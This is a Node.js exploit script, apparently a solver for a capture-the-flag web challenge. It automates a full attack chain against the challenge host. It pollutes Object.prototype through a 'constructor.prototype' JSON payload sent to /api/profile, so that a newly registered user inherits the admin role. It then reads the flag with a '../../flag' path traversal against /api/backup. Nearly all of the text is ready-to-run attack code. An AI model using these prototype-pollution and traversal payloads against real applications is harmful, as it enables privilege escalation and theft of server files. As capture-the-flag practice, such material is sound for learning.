
const http = require('http');
const querystring = require('querystring');

// 1. Login any existing user first
const existingUid = "2ca01c4924cc40e5b0c303f33d0aa184";

console.log("👉 Step 1: Login existing user...");
const loginData = querystring.stringify({uid: existingUid});
const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("👉 Step 2: Poison Object.prototype.role = admin via /api/profile...");

  // Poison here - because this is api/profile, res is passed to merge, so we can't use __proto__, use constructor.prototype
  const poisonData = JSON.stringify({
    "uid": existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });

  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };

  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let body = '';
    poisonRes.on('data', chunk => body += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Poisoning done! Now register NEW user...");

      // 2. Register new user - because poison is done now, NEW user will inherit role=admin
      const regData = querystring.stringify({username: "reallyadmin"});
      const regOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/register',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(regData)
        }
      };

      const regReq = http.request(regOpts, (regRes) => {
        let regBody = '';
        regRes.on('data', chunk => regBody += chunk);
        regRes.on('end', () => {
          let match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
          if (match) {
            let newUid = match[1];
            console.log(`✅ Registered new user, UID: ${newUid}`);
            console.log("👉 Login new user...");

            const newLoginData = querystring.stringify({uid: newUid});
            const newLoginOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/login',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(newLoginData)
              }
            };

            const newLoginReq = http.request(newLoginOpts, (newLoginRes) => {
              let newCookie = newLoginRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
              console.log("✅ Logged in, check dashboard...");

              const dashOpts = {
                hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                port: 80,
                path: '/dashboard',
                method: 'GET',
                headers: {
                  'Cookie': newCookie
                }
              };

              const dashReq = http.request(dashOpts, (dashRes) => {
                let dashBody = '';
                dashRes.on('data', chunk => dashBody += chunk);
                dashRes.on('end', () => {
                  console.log("\n📄 Dashboard:");
                  console.log(dashBody);
                  const hasDisabled = dashBody.includes('disabled');
                  if (!hasDisabled) {
                    console.log("\n🎉 WE ARE ADMIN! GETTING FLAG...");
                    const flagData = querystring.stringify({file: '../../flag'});
                    const flagOpts = {
                      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                      port: 80,
                      path: '/api/backup',
                      method: 'POST',
                      headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': Buffer.byteLength(flagData),
                        'Cookie': newCookie
                      }
                    };
                    const flagReq = http.request(flagOpts, (flagRes) => {
                      let flagBody = '';
                      flagRes.on('data', chunk => flagBody += chunk);
                      flagRes.on('end', () => {
                        console.log("\n🏁 🏁 🏁 FINAL FLAG:");
                        console.log(flagBody);
                      });
                    });
                    flagReq.write(flagData);
                    flagReq.end();
                  } else {
                    console.log("\n❌ Still not admin - button is disabled");
                  }
                });
              });
              dashReq.end();
            });
            newLoginReq.write(newLoginData);
            newLoginReq.end();
          }
        });
        });
        regReq.write(regData);
        regReq.end();
      });
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginData);
loginReq.end();
